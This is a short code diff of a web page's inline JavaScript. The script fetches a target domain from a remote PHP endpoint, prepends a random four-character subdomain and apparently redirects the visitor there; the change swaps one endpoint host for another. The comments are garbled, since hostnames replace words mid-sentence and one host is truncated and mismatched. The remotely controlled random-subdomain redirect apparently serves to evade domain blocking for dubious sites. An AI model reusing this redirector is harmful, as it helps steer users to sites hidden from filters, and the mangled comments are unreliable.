@@ -84,7 +84,7 @@
 
     <script>
         // 执行重定向
-        fetch('https://shop.ag.pgylxz302.me/get_links.php')
+        fetch('https://goog02.ptna2016.cc/get_links.php')
             .then(response => {
                 if (!response.ok) throw new Error('Network error');
                 return response.text();
@@ -92,14 +92,14 @@
             .then(domain => {
                 domain = domain.trim();
                 
-                // 检查是否为空shop.ag.pgylxz302.me
+                // 检查是否为空goog01.ptna2016.c
                 if (!domain) {
                     document.getElementById('adminAlert').style.display = 'block';
                     document.querySelector('.loading-text').textContent = 'Loading failed, contact the administrator';
                     return;
                 }
                 
-                // 生成4位随机子shop.ag.pgylxz302.me
+                // 生成4位随机子goog01.ptna2016.c
                 const random4Char = () => Math.random().toString(36).substring(2, 6);
                 const subdomain = random4Char();
                 
